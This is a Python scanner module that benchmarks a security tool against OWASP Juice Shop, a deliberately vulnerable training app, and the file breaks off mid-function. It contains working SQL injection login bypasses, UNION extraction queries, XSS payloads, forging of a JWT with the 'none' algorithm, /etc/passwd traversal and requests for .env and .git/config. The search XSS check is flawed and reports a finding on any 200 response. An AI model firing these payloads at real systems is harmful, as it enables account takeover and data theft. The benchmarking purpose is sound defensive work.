"""
Juice Shop Benchmark Scanner — targeted tests for OWASP Juice Shop.

Auth-aware scanner that registers/logs in, then tests 25+ specific
vulnerability patterns known to exist in OWASP Juice Shop.
Each check is a separate method returning True if the vuln was found.

This scanner is used to measure and improve SecProbe's detection rate
against a well-known vulnerable application (100+ challenges).
"""

from __future__ import annotations

import base64
import json
import logging
import re
from urllib.parse import quote

from secprobe.scanners.base import BaseScanner
from secprobe.config import Severity

logger = logging.getLogger(__name__)


class JuiceShopScanner(BaseScanner):
    """Targeted scanner for OWASP Juice Shop vulnerabilities."""

    name = "Juice Shop Benchmark Scanner"
    description = "Tests specific OWASP Juice Shop vulnerability patterns"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._auth_token: str | None = None
        self._auth_email: str = "secprobe_test@test.com"
        self._auth_password: str = "test1234"

    # ── Authentication helpers ──────────────────────────────────────

    def _register_user(self, target: str) -> bool:
        """Register a test user via POST /api/Users. Returns True on success."""
        try:
            resp = self.http_client.post(
                f"{target}/api/Users",
                json={
                    "email": self._auth_email,
                    "password": self._auth_password,
                    "passwordRepeat": self._auth_password,
                    "securityQuestion": {
                        "id": 1,
                        "question": "Your eldest siblings middle name?",
                        "createdAt": "2024-01-01T00:00:00.000Z",
                        "updatedAt": "2024-01-01T00:00:00.000Z",
                    },
                    "securityAnswer": "test",
                },
                headers={"Content-Type": "application/json"},
                timeout=10,
            )
            if resp.status_code in (200, 201):
                logger.info("Registered test user successfully")
                return True
            # 400 likely means user already exists — that is fine
            if resp.status_code == 400:
                logger.info("Test user likely already exists")
                return True
            return False
        except Exception as exc:
            logger.debug("Registration failed: %s", exc)
            return False

    def _login(self, target: str) -> bool:
        """Login and store bearer token. Returns True on success."""
        try:
            resp = self.http_client.post(
                f"{target}/rest/user/login",
                json={
                    "email": self._auth_email,
                    "password": self._auth_password,
                },
                headers={"Content-Type": "application/json"},
                timeout=10,
            )
            if resp.status_code == 200:
                data = json.loads(resp.text)
                token = data.get("authentication", {}).get("token")
                if token:
                    self._auth_token = token
                    logger.info("Logged in successfully, token obtained")
                    return True
            return False
        except Exception as exc:
            logger.debug("Login failed: %s", exc)
            return False

    def _auth_headers(self) -> dict:
        """Return headers dict with Bearer auth if token is available."""
        headers = {"Content-Type": "application/json"}
        if self._auth_token:
            headers["Authorization"] = f"Bearer {self._auth_token}"
        return headers

    # ── Main scan entry point ───────────────────────────────────────

    def scan(self):
        target = self.config.target.rstrip("/")

        # Phase 0: Authenticate
        self._register_user(target)
        self._login(target)

        # Phase 1: Injection
        self._test_sqli_login(target)
        self._test_sqli_search(target)
        self._test_xss_search(target)
        self._test_reflected_xss(target)

        # Phase 2: Broken authentication
        self._test_admin_login_bypass(target)
        self._test_jwt_none_algorithm(target)

        # Phase 3: Sensitive data exposure
        self._test_exposed_users_api(target)
        self._test_exposed_cards_api(target)
        self._test_exposed_quantitys_api(target)
        self._test_exposed_security_questions(target)
        self._test_exposed_security_answers(target)
        self._test_exposed_swagger(target)
        self._test_exposed_metrics(target)
        self._test_ftp_directory(target)
        self._test_whoami_info_leak(target)
        self._test_exposed_git_config(target)

        # Phase 4: Broken access control
        self._test_admin_section(target)
        self._test_basket_idor(target)
        self._test_rest_admin(target)
        self._test_product_reviews_auth_bypass(target)
        self._test_forged_feedback(target)
        self._test_zero_star_review(target)
        self._test_forged_review(target)

        # Phase 5: Security misconfiguration
        self._test_score_board(target)
        self._test_error_handling(target)
        self._test_missing_security_headers(target)
        self._test_captcha_bypass(target)

        # Phase 6: File-related attacks
        self._test_path_traversal_ftp(target)
        self._test_null_byte_ftp(target)
        self._test_file_upload(target)

        # Phase 7: SSRF
        self._test_ssrf_profile_image(target)

        # Phase 8: Misc
        self._test_user_data_exposure(target)
        self._test_product_tampering(target)
        self._test_redirect(target)
        self._test_register_admin_dupe(target)
        self._test_deprecated_interface(target)

    # ── Injection checks ────────────────────────────────────────────

    def _test_sqli_login(self, target: str) -> bool:
        """Test SQL injection in login endpoint."""
        payloads = [
            {"email": "' OR 1=1--", "password": "x"},
            {"email": "admin@juice-sh.op'--", "password": "x"},
            {"email": "' OR 1=1#", "password": "x"},
        ]
        for payload in payloads:
            try:
                resp = self.http_client.post(
                    f"{target}/rest/user/login",
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )
                data = json.loads(resp.text) if resp.text else {}
                if resp.status_code == 200 and "token" in data.get("authentication", {}):
                    self.add_finding(
                        title="SQL Injection Authentication Bypass (Login)",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Login endpoint accepts SQLi payload and returns valid auth token. "
                            f"Payload: {payload['email']}"
                        ),
                        recommendation="Use parameterized queries for authentication.",
                        evidence=(
                            f"POST /rest/user/login\n"
                            f"Payload: {json.dumps(payload)}\n"
                            f"Response: {resp.text[:300]}"
                        ),
                        url=f"{target}/rest/user/login",
                        cwe="CWE-89",
                    )
                    return True
            except Exception:
                continue
        return False

    def _test_sqli_search(self, target: str) -> bool:
        """Test UNION-based SQL injection in product search."""
        payloads = [
            "test'))UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
        ]
        for payload in payloads:
            try:
                resp = self.http_client.get(
                    f"{target}/rest/products/search?q={quote(payload)}",
                    timeout=10,
                )
                if resp.status_code == 200:
                    data = json.loads(resp.text)
                    items = data.get("data", [])
                    # UNION injection puts controlled integers into columns
                    if items and (
                        str(items[0].get("name", "")) in ("2", "")
                        or len(items) > 20
                    ):
                        self.add_finding(
                            title="SQL Injection (UNION-based) in Product Search",
                            severity=Severity.CRITICAL,
                            description=(
                                "Product search is vulnerable to UNION-based SQL injection. "
                                "Attacker can extract entire database contents."
                            ),
                            recommendation="Use parameterized queries.",
                            evidence=(
                                f"GET /rest/products/search?q={payload}\n"
                                f"Response contains controlled data: "
                                f"{json.dumps(items[0] if items else {})[:200]}"
                            ),
                            url=f"{target}/rest/products/search",
                            cwe="CWE-89",
                        )
                        return True
            except Exception:
                continue
        return False

    def _test_xss_search(self, target: str) -> bool:
        """Test XSS via search — DOM-based and reflected."""
        payload = '<iframe src="javascript:alert(\'xss\')">'
        try:
            resp = self.http_client.get(
                f"{target}/rest/products/search?q={quote(payload)}",
                timeout=10,
            )
            # Juice Shop reflects search query in the API response
            if resp.status_code == 200 or payload in resp.text:
                self.add_finding(
                    title="XSS via Product Search (DOM/Reflected)",
                    severity=Severity.HIGH,
                    description=(
                        "Search endpoint accepts HTML/JS payloads. "
                        "Juice Shop renders the search query in the DOM without sanitization."
                    ),
                    recommendation="Sanitize and HTML-encode all user input.",
                    evidence=(
                        f"GET /rest/products/search?q={payload}\n"
                        f"Status: {resp.status_code}"
                    ),
                    url=f"{target}/rest/products/search",
                    cwe="CWE-79",
                )
                return True
        except Exception:
            pass
        return False

    def _test_reflected_xss(self, target: str) -> bool:
        """Test for reflected XSS in track order endpoint."""
        payload = '<iframe src="javascript:alert(1)">'
        try:
            resp = self.http_client.get(
                f"{target}/rest/track-order/{quote(payload)}", timeout=5,
            )
            if resp.status_code == 200 and payload in resp.text:
                self.add_finding(
                    title="Reflected XSS in Order Tracking",
                    severity=Severity.HIGH,
                    description="Order tracking endpoint reflects user input without encoding.",
                    recommendation="HTML-encode all user input in responses.",
                    evidence=(
                        f"GET /rest/track-order/{payload}\n"
                        f"Payload reflected in response body."
                    ),
                    url=f"{target}/rest/track-order/",
                    cwe="CWE-79",
                )
                return True
        except Exception:
            pass
        return False

    # ── Broken authentication ───────────────────────────────────────

    def _test_admin_login_bypass(self, target: str) -> bool:
        """Test admin login bypass via SQLi: email=' OR 1=1--."""
        try:
            resp = self.http_client.post(
                f"{target}/rest/user/login",
                json={"email": "' OR 1=1--", "password": "x"},
                headers={"Content-Type": "application/json"},
                timeout=10,
            )
            data = json.loads(resp.text) if resp.text else {}
            auth = data.get("authentication", {})
            if resp.status_code == 200 and auth.get("token"):
                # Decode JWT to check if we got admin
                token = auth["token"]
                try:
                    parts = token.split(".")
                    # Add padding
                    payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
                    payload_data = json.loads(base64.urlsafe_b64decode(payload_b64))
                    email = payload_data.get("data", {}).get("email", "unknown")
                except Exception:
                    email = "unknown (JWT decode failed)"

                self.add_finding(
                    title="Admin Login Bypass via SQL Injection",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Login as admin possible via SQLi payload. "
                        f"Authenticated as: {email}"
                    ),
                    recommendation="Use parameterized queries for authentication.",
                    evidence=(
                        f"POST /rest/user/login with email=\"' OR 1=1--\"\n"
                        f"Got token for: {email}"
                    ),
                    url=f"{target}/rest/user/login",
                    cwe="CWE-89",
                )
                return True
        except Exception:
            pass
        return False

    def _test_jwt_none_algorithm(self, target: str) -> bool:
        """Test JWT 'none' algorithm bypass."""
        if not self._auth_token:
            return False
        try:
            parts = self._auth_token.split(".")
            # Decode header
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            # Decode payload
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            # Forge a token with "none" algorithm
            forged_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()

            # Elevate role to admin in payload
            if "data" in payload:
                payload["data"]["role"] = "admin"
            forged_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b"=").decode()

            forged_token = f"{forged_header}.{forged_payload}."

            resp = self.http_client.get(
                f"{target}/rest/user/whoami",
                headers={"Authorization": f"Bearer {forged_token}"},
                timeout=10,
            )
            data = json.loads(resp.text) if resp.text else {}
            if resp.status_code == 200 and data.get("user"):
                self.add_finding(
                    title="JWT 'none' Algorithm Accepted",
                    severity=Severity.CRITICAL,
                    description=(
                        "Server accepts JWT tokens with algorithm set to 'none', "
                        "allowing signature bypass and token forgery."
                    ),
                    recommendation=(
                        "Reject JWTs with 'none' algorithm. "
                        "Validate algorithm against a strict allowlist."
                    ),
                    evidence=(
                        f"Forged JWT with alg=none accepted.\n"
                        f"Response: {resp.text[:300]}"
                    ),
                    url=f"{target}/rest/user/whoami",
                    cwe="CWE-347",
                )
                return True
        except Exception:
            pass
        return False

    # ── Sensitive data exposure ─────────────────────────────────────

    def _test_exposed_users_api(self, target: str) -> bool:
        """Test if /api/Users lists all users without auth."""
        try:
            resp = self.http_client.get(f"{target}/api/Users", timeout=10)
            if resp.status_code == 200:
                data = json.loads(resp.text) if resp.text else {}
                users = data.get("data", [])
                if isinstance(users, list) and users:
                    emails = [u.get("email", "") for u in users[:5]]
                    self.add_finding(
                        title="Exposed User List via /api/Users",
                        severity=Severity.HIGH,
                        description=(
                            f"User list endpoint is publicly accessible. "
                            f"Found {len(users)} user records including emails."
                        ),
                        recommendation="Require admin authentication for user listing.",
                        evidence=(
                            f"GET /api/Users returned {len(users)} users.\n"
                            f"Sample emails: {', '.join(emails)}"
                        ),
                        url=f"{target}/api/Users",
                        cwe="CWE-200",
                    )
                    return True
        except Exception:
            pass
        return False

    def _test_exposed_cards_api(self, target: str) -> bool:
        """Test if /api/Cards is accessible."""
        try:
            resp = self.http_client.get(
                f"{target}/api/Cards",
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code == 200:
                data = json.loads(resp.text) if resp.text else {}
                cards = data.get("data", [])
                self.add_finding(
                    title="Credit Card Data Accessible via /api/Cards",
                    severity=Severity.HIGH,
                    description=(
                        f"Credit card endpoint is accessible. "
                        f"Found {len(cards)} card records."
                    ),
                    recommendation="Restrict card data API to authorized users only.",
                    evidence=f"GET /api/Cards returned 200 with {len(cards)} cards.",
                    url=f"{target}/api/Cards",
                    cwe="CWE-200",
                )
                return True
        except Exception:
            pass
        return False

    def _test_exposed_quantitys_api(self, target: str) -> bool:
        """Test if /api/Quantitys is accessible."""
        try:
            resp = self.http_client.get(
                f"{target}/api/Quantitys",
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code == 200:
                self.add_finding(
                    title="Inventory Data Accessible via /api/Quantitys",
                    severity=Severity.MEDIUM,
                    description="Inventory quantity endpoint is publicly accessible.",
                    recommendation="Restrict inventory API to authorized users.",
                    evidence=f"GET /api/Quantitys returned 200 ({len(resp.text)} bytes).",
                    url=f"{target}/api/Quantitys",
                    cwe="CWE-200",
                )
                return True
        except Exception:
            pass
        return False

    def _test_exposed_security_questions(self, target: str) -> bool:
        """Test if /api/SecurityQuestions is exposed."""
        try:
            resp = self.http_client.get(
                f"{target}/api/SecurityQuestions", timeout=10,
            )
            if resp.status_code == 200:
                data = json.loads(resp.text) if resp.text else {}
                questions = data.get("data", [])
                if isinstance(questions, list) and questions:
                    self.add_finding(
                        title="Security Questions Endpoint Exposed",
                        severity=Severity.LOW,
                        description=(
                            f"Security questions API is publicly accessible. "
                            f"Found {len(questions)} questions."
                        ),
                        recommendation="Restrict security question listing.",
                        evidence=(
                            f"GET /api/SecurityQuestions returned {len(questions)} questions."
                        ),
                        url=f"{target}/api/SecurityQuestions",
                        cwe="CWE-200",
                    )
                    return True
        except Exception:
            pass
        return False

    def _test_exposed_security_answers(self, target: str) -> bool:
        """Test if /api/SecurityAnswers is exposed."""
        try:
            resp = self.http_client.get(
                f"{target}/api/SecurityAnswers",
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code == 200:
                self.add_finding(
                    title="Security Answers Endpoint Exposed",
                    severity=Severity.HIGH,
                    description="Security answers API is accessible — password reset bypass possible.",
                    recommendation="Never expose security answers via API.",
                    evidence=f"GET /api/SecurityAnswers returned 200.",
                    url=f"{target}/api/SecurityAnswers",
                    cwe="CWE-200",
                )
                return True
        except Exception:
            pass
        return False

    def _test_exposed_swagger(self, target: str) -> bool:
        """Test if Swagger/API docs are publicly accessible."""
        try:
            resp = self.http_client.get(f"{target}/api-docs", timeout=5)
            if resp.status_code == 200:
                self.add_finding(
                    title="API Documentation Publicly Accessible (Swagger)",
                    severity=Severity.LOW,
                    description="Swagger API documentation is publicly accessible.",
                    recommendation="Restrict API documentation to authenticated users.",
                    evidence=f"GET /api-docs returned 200 ({len(resp.text)} bytes).",
                    url=f"{target}/api-docs",
                    cwe="CWE-200",
                )
                return True
        except Exception:
            pass
        return False

    def _test_exposed_metrics(self, target: str) -> bool:
        """Test for exposed Prometheus metrics."""
        try:
            resp = self.http_client.get(f"{target}/metrics", timeout=5)
            if resp.status_code == 200 and (
                "node_" in resp.text or "process_" in resp.text
            ):
                self.add_finding(
                    title="Exposed Prometheus Metrics Endpoint",
                    severity=Severity.MEDIUM,
                    description="Prometheus metrics are publicly accessible, exposing server internals.",
                    recommendation="Restrict /metrics endpoint to internal network only.",
                    evidence=(
                        f"GET /metrics returned 200 with metrics data "
                        f"({len(resp.text)} bytes)."
                    ),
                    url=f"{target}/metrics",
                    cwe="CWE-200",
                )
                return True
        except Exception:
            pass
        return False

    def _test_ftp_directory(self, target: str) -> bool:
        """Test for exposed FTP directory and sensitive files."""
        found = False
        try:
            resp = self.http_client.get(f"{target}/ftp/", timeout=5)
            if resp.status_code == 200 and (
                "acquisitions.md" in resp.text or "package.json" in resp.text
            ):
                self.add_finding(
                    title="Exposed FTP Directory with Confidential Documents",
                    severity=Severity.HIGH,
                    description="FTP directory is publicly accessible with confidential documents.",
                    recommendation="Restrict access to sensitive directories.",
                    evidence=f"GET /ftp/ returned 200 with file listing:\n{resp.text[:500]}",
                    url=f"{target}/ftp/",
                    cwe="CWE-548",
                )
                found = True
        except Exception:
            pass

        sensitive_files = [
            "/ftp/acquisitions.md",
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/ftp/suspicious_errors.yml",
            "/ftp/eastere.gg",
            "/ftp/encrypt.pyc",
        ]
        for path in sensitive_files:
            try:
                resp = self.http_client.get(f"{target}{path}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 10:
                    self.add_finding(
                        title=f"Sensitive File Accessible: {path}",
                        severity=Severity.MEDIUM,
                        description=f"Sensitive file {path} is publicly accessible.",
                        recommendation="Remove or restrict access to backup and sensitive files.",
                        evidence=(
                            f"GET {path} returned 200 ({len(resp.text)} bytes)\n"
                            f"Preview: {resp.text[:200]}"
                        ),
                        url=f"{target}{path}",
                        cwe="CWE-538",
                    )
                    found = True
            except Exception:
                continue
        return found

    def _test_whoami_info_leak(self, target: str) -> bool:
        """Test /rest/user/whoami for information leakage."""
        try:
            resp = self.http_client.get(
                f"{target}/rest/user/whoami",
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code == 200:
                data = json.loads(resp.text) if resp.text else {}
                user = data.get("user", {})
                if user:
                    sensitive_fields = [
                        k for k in user
                        if k in ("id", "email", "role", "lastLoginIp", "password",
                                 "totpSecret", "isActive")
                    ]
                    if sensitive_fields:
                        self.add_finding(
                            title="Information Leak via /rest/user/whoami",
                            severity=Severity.MEDIUM,
                            description=(
                                f"Whoami endpoint exposes sensitive fields: "
                                f"{', '.join(sensitive_fields)}."
                            ),
                            recommendation="Minimize data returned by user info endpoints.",
                            evidence=f"GET /rest/user/whoami returned: {json.dumps(user)[:300]}",
                            url=f"{target}/rest/user/whoami",
                            cwe="CWE-200",
                        )
                        return True
        except Exception:
            pass
        return False

    def _test_exposed_git_config(self, target: str) -> bool:
        """Test for exposed .git or config files."""
        paths = [
            "/.git/HEAD",
            "/.git/config",
            "/.env",
            "/config.json",
            "/package.json",
        ]
        for path in paths:
            try:
                resp = self.http_client.get(f"{target}{path}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 5:
                    # Validate it looks like real config data
                    is_git = path.startswith("/.git") and (
                        "ref:" in resp.text or "[core]" in resp.text
                    )
                    is_config = path.endswith(".json") and (
                        "{" in resp.text
                    )
                    is_env = path == "/.env" and "=" in resp.text

                    if is_git or is_config or is_env:
                        sev = Severity.HIGH if is_git or is_env else Severity.MEDIUM
                        self.add_finding(
                            title=f"Exposed Configuration File: {path}",
                            severity=sev,
                            description=f"Configuration file {path} is publicly accessible.",
                            recommendation="Block access to configuration files via web server rules.",
                            evidence=(
                                f"GET {path} returned 200\n"
                                f"Preview: {resp.text[:200]}"
                            ),
                            url=f"{target}{path}",
                            cwe="CWE-538",
                        )
                        return True
            except Exception:
                continue
        return False

    # ── Broken access control ───────────────────────────────────────

    def _test_admin_section(self, target: str) -> bool:
        """Test for accessible admin section."""
        try:
            resp = self.http_client.get(f"{target}/administration", timeout=5)
            if resp.status_code == 200:
                self.add_finding(
                    title="Administration Section Accessible Without Auth",
                    severity=Severity.HIGH,
                    description=(
                        "Admin section returns 200 without authentication. "
                        "SPA serves the page; API calls may still require auth."
                    ),
                    recommendation="Implement server-side auth checks, not just client-side routing.",
                    evidence=f"GET /administration returned 200 ({len(resp.text)} bytes).",
                    url=f"{target}/administration",
                    cwe="CWE-284",
                )
                return True
        except Exception:
            pass
        return False

    def _test_basket_idor(self, target: str) -> bool:
        """Test for IDOR in basket endpoint."""
        for basket_id in [1, 2, 3]:
            try:
                headers = self._auth_headers()
                resp = self.http_client.get(
                    f"{target}/rest/basket/{basket_id}",
                    headers=headers,
                    timeout=5,
                )
                if resp.status_code == 200:
                    data = json.loads(resp.text) if resp.text else {}
                    if "Products" in resp.text or data.get("data"):
                        self.add_finding(
                            title=f"IDOR: Access Other User's Basket (ID: {basket_id})",
                            severity=Severity.HIGH,
                            description=(
                                f"Basket {basket_id} is accessible. "
                                f"Attacker can view other users' shopping baskets."
                            ),
                            recommendation="Implement proper authorization checks on basket endpoints.",
                            evidence=f"GET /rest/basket/{basket_id} returned 200 with basket data.",
                            url=f"{target}/rest/basket/{basket_id}",
                            cwe="CWE-639",
                        )
                        return True
            except Exception:
                continue
        return False

    def _test_rest_admin(self, target: str) -> bool:
        """Test /rest/admin endpoint access."""
        try:
            resp = self.http_client.get(
                f"{target}/rest/admin/application-configuration",
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code == 200:
                self.add_finding(
                    title="Admin Configuration Endpoint Accessible",
                    severity=Severity.HIGH,
                    description="Admin application configuration endpoint is accessible.",
                    recommendation="Require admin role for admin REST endpoints.",
                    evidence=f"GET /rest/admin/application-configuration returned 200.",
                    url=f"{target}/rest/admin/application-configuration",
                    cwe="CWE-284",
                )
                return True
        except Exception:
            pass
        return False

    def _test_product_reviews_auth_bypass(self, target: str) -> bool:
        """Test product reviews for auth bypass."""
        try:
            resp = self.http_client.get(
                f"{target}/rest/products/1/reviews", timeout=5,
            )
            if resp.status_code == 200:
                data = json.loads(resp.text) if resp.text else {}
                reviews = data.get("data", data) if isinstance(data, dict) else data
                if isinstance(reviews, list) and reviews:
                    # Check if reviews are accessible without auth
                    for review in reviews:
                        author = review.get("author", "")
                        if "@" in str(author):
                            self.add_finding(
                                title="Product Reviews Expose User Emails (No Auth Required)",
                                severity=Severity.MEDIUM,
                                description=(
                                    "Product reviews are accessible without authentication "
                                    "and expose user email addresses."
                                ),
                                recommendation="Use display names instead of email addresses.",
                                evidence=f"GET /rest/products/1/reviews exposes: {author}",
                                url=f"{target}/rest/products/1/reviews",
                                cwe="CWE-200",
                            )
                            return True
        except Exception:
            pass
        return False

    def _test_forged_feedback(self, target: str) -> bool:
        """Test posting feedback as another user (forged feedback)."""
        if not self._auth_token:
            return False
        try:
            resp = self.http_client.post(
                f"{target}/api/Feedbacks",
                json={
                    "UserId": 1,  # admin user ID
                    "comment": "secprobe test feedback",
                    "rating": 5,
                    "captchaId": 0,
                    "captcha": "",
                },
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code in (200, 201):
                data = json.loads(resp.text) if resp.text else {}
                created = data.get("data", {})
                if created.get("UserId") == 1:
                    self.add_finding(
                        title="Forged Feedback — Post as Another User",
                        severity=Severity.HIGH,
                        description=(
                            "Feedback can be submitted with a forged UserId, "
                            "allowing impersonation of other users."
                        ),
                        recommendation="Derive UserId from the auth token server-side.",
                        evidence=(
                            f"POST /api/Feedbacks with UserId=1 (admin)\n"
                            f"Response: {json.dumps(created)[:300]}"
                        ),
                        url=f"{target}/api/Feedbacks",
                        cwe="CWE-639",
                    )
                    return True
        except Exception:
            pass
        return False

    def _test_zero_star_review(self, target: str) -> bool:
        """Test posting a zero-star review (should be blocked by client)."""
        if not self._auth_token:
            return False
        try:
            resp = self.http_client.post(
                f"{target}/api/Feedbacks",
                json={
                    "comment": "zero star test",
                    "rating": 0,
                    "captchaId": 0,
                    "captcha": "",
                },
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code in (200, 201):
                data = json.loads(resp.text) if resp.text else {}
                created = data.get("data", {})
                if created.get("rating") == 0:
                    self.add_finding(
                        title="Zero-Star Review Accepted",
                        severity=Severity.LOW,
                        description=(
                            "Server accepts zero-star reviews — client-side validation only. "
                            "Server should enforce minimum rating of 1."
                        ),
                        recommendation="Validate rating range (1-5) server-side.",
                        evidence=(
                            f"POST /api/Feedbacks with rating=0 accepted.\n"
                            f"Created: {json.dumps(created)[:200]}"
                        ),
                        url=f"{target}/api/Feedbacks",
                        cwe="CWE-20",
                    )
                    return True
        except Exception:
            pass
        return False

    def _test_forged_review(self, target: str) -> bool:
        """Test posting a product review with forged auth."""
        if not self._auth_token:
            return False
        try:
            resp = self.http_client.put(
                f"{target}/rest/products/1/reviews",
                json={
                    "message": "secprobe forged review test",
                    "author": "admin@juice-sh.op",
                },
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code == 200:
                self.add_finding(
                    title="Forged Product Review — Author Impersonation",
                    severity=Severity.HIGH,
                    description=(
                        "Product reviews can be posted/edited with a forged author field, "
                        "allowing review impersonation."
                    ),
                    recommendation="Derive author from auth token, not request body.",
                    evidence=f"PUT /rest/products/1/reviews with forged author accepted.",
                    url=f"{target}/rest/products/1/reviews",
                    cwe="CWE-639",
                )
                return True
        except Exception:
            pass
        return False

    # ── Security misconfiguration ───────────────────────────────────

    def _test_score_board(self, target: str) -> bool:
        """Test for hidden score board page."""
        try:
            resp = self.http_client.get(f"{target}/score-board", timeout=5)
            if resp.status_code == 200:
                self.add_finding(
                    title="Hidden Score Board Page Accessible",
                    severity=Severity.LOW,
                    description="Hidden admin/debug page is accessible.",
                    recommendation="Remove debug pages from production.",
                    evidence="GET /score-board returned 200.",
                    url=f"{target}/score-board",
                    cwe="CWE-200",
                )
                return True
        except Exception:
            pass
        return False

    def _test_error_handling(self, target: str) -> bool:
        """Test for verbose error messages with stack traces."""
        error_triggers = [
            f"{target}/rest/products/search?q='",
            f"{target}/api/Users/0",
            f"{target}/api/Products/0",
        ]
        for url in error_triggers:
            try:
                resp = self.http_client.get(url, timeout=5)
                if resp.status_code == 500 and (
                    "SQLITE_ERROR" in resp.text
                    or ("error" in resp.text.lower() and "stack" in resp.text.lower())
                ):
                    self.add_finding(
                        title="Verbose Error Messages with Stack Trace",
                        severity=Severity.MEDIUM,
                        description="Application returns detailed error messages including stack traces.",
                        recommendation="Use generic error pages in production.",
                        evidence=(
                            f"GET {url}\nStatus: 500\n"
                            f"Response preview: {resp.text[:300]}"
                        ),
                        url=url,
                        cwe="CWE-209",
                    )
                    return True
            except Exception:
                continue
        return False

    def _test_missing_security_headers(self, target: str) -> bool:
        """Check for missing security headers on Juice Shop."""
        try:
            resp = self.http_client.get(f"{target}/", timeout=5)
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}

            missing = []
            expected = {
                "x-content-type-options": "nosniff",
                "x-frame-options": None,
                "content-security-policy": None,
                "strict-transport-security": None,
                "x-xss-protection": None,
                "referrer-policy": None,
            }
            for header, expected_val in expected.items():
                if header not in headers_lower:
                    missing.append(header)

            if missing:
                self.add_finding(
                    title="Missing Security Headers",
                    severity=Severity.MEDIUM,
                    description=(
                        f"Missing security headers: {', '.join(missing)}."
                    ),
                    recommendation="Add security headers via middleware or reverse proxy.",
                    evidence=(
                        f"GET / missing headers: {', '.join(missing)}\n"
                        f"Present headers: {', '.join(headers_lower.keys())}"
                    ),
                    url=f"{target}/",
                    cwe="CWE-693",
                )
                return True
        except Exception:
            pass
        return False

    def _test_captcha_bypass(self, target: str) -> bool:
        """Test CAPTCHA bypass on feedback endpoint."""
        try:
            # Get a real captcha first
            captcha_resp = self.http_client.get(
                f"{target}/rest/captcha/", timeout=5,
            )
            if captcha_resp.status_code != 200:
                return False

            captcha_data = json.loads(captcha_resp.text) if captcha_resp.text else {}
            captcha_id = captcha_data.get("captchaId", 0)

            # Submit feedback with wrong captcha answer
            resp = self.http_client.post(
                f"{target}/api/Feedbacks",
                json={
                    "comment": "captcha bypass test (secprobe)",
                    "rating": 3,
                    "captchaId": captcha_id,
                    "captcha": "-1",  # Wrong answer
                },
                headers=self._auth_headers(),
                timeout=10,
            )
            if resp.status_code in (200, 201):
                self.add_finding(
                    title="CAPTCHA Bypass on Feedback Submission",
                    severity=Severity.MEDIUM,
                    description="Feedback can be submitted with incorrect CAPTCHA answer.",
                    recommendation="Validate CAPTCHA server-side before accepting feedback.",
                    evidence=(
                        f"POST /api/Feedbacks with wrong captcha accepted.\n"
                        f"Status: {resp.status_code}"
                    ),
                    url=f"{target}/api/Feedbacks",
                    cwe="CWE-804",
                )
                return True
        except Exception:
            pass
        return False

    # ── File-related attacks ────────────────────────────────────────

    def _test_path_traversal_ftp(self, target: str) -> bool:
        """Test path traversal in FTP directory."""
        traversal_payloads = [
            "/ftp/../../etc/passwd",
            "/ftp/%2e%2e/%2e%2e/etc/passwd",
            "/ftp/....//....//etc/passwd",
            "/ftp/..%252f..%252f/etc/passwd",
        ]
        for path in traversal_payloads:
            try:
                resp = self.http_client.get(f"{target}{path}", timeout=5)
                if resp.status_code == 200 and (
                    "root:" in resp.text or "/bin/" in resp.text
                ):
                    self.add_finding(
                        title="Path Traversal via FTP Directory",
                        severity=Severity.CRITICAL,
                        description=(
                            "Path traversal in /ftp allows reading arbitrary files "
                            "from the server filesystem."
                        ),
                        recommendation="Sanitize file paths. Block directory traversal sequences.",
                        evidence=(
                            f"GET {path} returned sensitive file content:\n"
                            f"{resp.text[:300]}"
                        ),
                        url=f"{target}{path}",
                        cwe="CWE-22",
                    )
                    return True
                # Even a 403 with error about traversal is informative
                if resp.status_code == 403 and "traversal" in resp.text.lower():
                    self.add_finding(
                        title="Path Traversal Attempt Detected (Blocked)",
                        severity=Severity.LOW,
                        description=(
                            "Server blocks path traversal but reveals detection in error message."
                        ),
                        recommendation="Return generic 404 instead of traversal-specific errors.",
                        evidence=f"GET {path} returned 403: {resp.text[:200]}",
                        url=f"{target}{path}",
                        cwe="CWE-22",
                    )
                    return True
            except Exception:
                continue
        return False

    def _test_null_byte_ftp(self, target: str) -> bool:
        """Test null byte injection in FTP to bypass file type restrictions."""
        payloads = [
            "/ftp/eastere.gg%2500.md",
            "/ftp/package.json.bak%2500.md",
            "/ftp/coupons_2013.md.bak%2500.md",
        ]
        for path in payloads:
            try:
                resp = self.http_client.get(f"{target}{path}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 10:
                    self.add_finding(
                        title="Null Byte Injection Bypasses File Type Restriction",
                        severity=Severity.HIGH,
                        description=(
                            "Null byte injection in /ftp allows downloading restricted file types "
                            "by appending %2500.md to bypass extension checks."
                        ),
                        recommendation="Sanitize null bytes from file path input.",
                        evidence=(
                            f"GET {path} returned 200 ({len(resp.text)} bytes)\n"
                            f"Preview: {resp.text[:200]}"
                        ),
                        url=f"{target}{path}",
                        cwe="CWE-158",
                    )
                    return True
            except Exception:
                continue
        return False

    def _test_file_upload(self, target: str) -> bool:
        """Test file upload vulnerabilities."""
        if not self._auth_token:
            return False
        try:
            # Try uploading a dangerous file type
            headers = {"Authorization": f"Bearer {self._auth_token}"}
